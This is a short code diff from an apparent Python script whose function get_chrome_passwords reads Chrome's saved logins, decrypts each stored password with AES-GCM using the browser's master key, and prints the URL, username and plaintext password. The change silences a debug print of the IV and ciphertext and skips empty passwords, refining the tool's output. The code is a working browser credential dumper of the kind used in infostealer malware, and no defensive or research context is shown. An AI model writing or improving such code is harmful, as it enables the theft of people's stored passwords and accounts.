@@ -31,7 +31,7 @@ def get_chrome_passwords():
         iv = buffer[3:15]
         enc_pass = buffer[15:]
         cipher = AES.new(master_key, AES.MODE_GCM, iv)
-        print(iv,"---",enc_pass)
+        #print(iv,"---",enc_pass)
         dec_pass =  cipher.decrypt(enc_pass)
         return dec_pass[:-16].decode('utf-8')
 
@@ -46,7 +46,8 @@ def get_chrome_passwords():
             username = r[2]
             encrypt_pass = r[3]
             decrypt_pass = dec(encrypt_pass)
-            print(url,"[+]",username,"[+]",decrypt_pass)
+            if len(decrypt_pass)!=0:
+                print(url,"[+]",username,"[+]",decrypt_pass)
     except Exception as e:
         print(e)
     connection.close()
